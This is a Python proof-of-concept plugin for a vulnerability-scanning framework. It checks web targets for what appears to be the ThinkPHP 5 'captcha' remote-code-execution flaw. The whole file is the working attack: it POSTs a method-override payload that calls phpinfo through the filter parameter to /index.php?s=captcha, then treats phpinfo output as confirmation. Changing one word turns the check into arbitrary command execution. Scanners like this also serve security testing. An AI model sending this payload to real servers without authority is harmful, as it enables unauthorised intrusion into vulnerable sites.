from cvpoc.api import POCBase, register_poc, requests, parse_output

# http请求开启debug模式
# from http import client
#
# client.HTTPConnection.debuglevel = 1


class CvPOC(POCBase):
    # cv_id = 1  # 极光无限漏洞库唯一编号

    # 验证方法
    def _verify(self):
        result = {}
        # 验证命中返回True,验证失败返回False
        p = self._check(self.url)
        result['status'] = p
        # 解析结果
        return parse_output(result)

    def _check(self, url):
        flag = 'PHP Extension Build'
        data = "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"

        payloads = [
            r"/index.php?s=captcha"
        ]
        for payload in payloads:
            vul_url = url + payload
            headers = {
                "Content-Type": "application/x-www-form-urlencoded"
            }
            r = requests.post(vul_url, data=data, headers=headers)

            if flag in r.text:
                return True
        return False


register_poc(CvPOC)
